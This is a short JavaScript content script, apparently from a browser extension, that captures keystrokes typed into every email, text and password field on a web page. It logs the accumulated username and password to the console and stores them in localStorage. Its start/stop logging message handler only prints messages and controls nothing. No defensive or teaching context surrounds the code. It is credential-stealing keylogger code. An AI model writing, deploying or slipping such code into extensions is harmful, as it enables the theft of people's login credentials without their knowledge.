// content.js

$(document).ready(function () {
    let capturedData = { usernameOrEmail: "", password: "" };

    $('input[type="email"], input[type="text"]').on('keypress', function (e) {
        capturedData.usernameOrEmail += e.key;
        console.log('Username or Email:', capturedData.usernameOrEmail);
        localStorage.setItem("usernameOrEmail", capturedData.usernameOrEmail);
    });

    $('input[type="password"]').on('keypress', function (e) {
        capturedData.password += e.key;
        console.log('Password:', capturedData.password);
        localStorage.setItem("password", capturedData.password);
    });
});

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.action === 'startLogging') {
        console.log('Logging started');
    } else if (request.action === 'stopLogging') {
        console.log('Logging stopped');
    }
});
